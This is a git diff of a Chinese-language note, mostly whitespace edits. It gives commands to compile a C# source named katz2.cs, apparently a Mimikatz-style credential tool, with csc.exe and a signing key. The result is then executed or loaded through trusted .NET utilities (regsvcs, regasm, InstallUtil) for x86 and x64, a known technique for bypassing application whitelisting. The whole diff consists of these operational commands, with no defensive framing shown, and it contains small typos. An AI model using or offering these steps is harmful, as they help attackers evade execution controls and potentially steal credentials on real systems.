@@ -11,21 +11,23 @@ Set-Content key.snk -Value $Content -Encoding Byte
 ```
 **使用Csc编译多种文件格式并使用多种方式执行**   
 **Csc编译成exe**  
-&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz2.cs
-使用如下的方式运行
-&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe 
-x64
-&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe katz.exe 
-[OR]
+&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz2.cs  
+使用如下的方式运行  
+&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe katz.exe   
+x64  
+&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regsvcs.exe katz.exe   
+[OR]  
 &nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\vv2.0.50727\regasm.exe katz.exe
 &nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe /U katz.exe 
 &nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe /U katz.exe
-&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U katz.exe
-[OR]
+&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe /U katz.exe  
+[OR]  
 &nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /U katz.exe
 &nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /U katz.exe  
 **CscCsc编译成DLL**  
-&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll   /r:System.IO.Compression.dll /target:library /out:regsvcs.dll /keyfile:key.snk /unsafe katz2.cs 
+&nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll
+/r:System.IO.Compression.dll /target:library /out:regsvcs.dll /keyfile:key.snk /unsafe katz2.cs  
+使用如下的方式运行  
 &nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe regsvcs.dll   
 x64  
 &nbsp;&nbsp;&nbsp;&nbsp;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe regsvcs.dll   
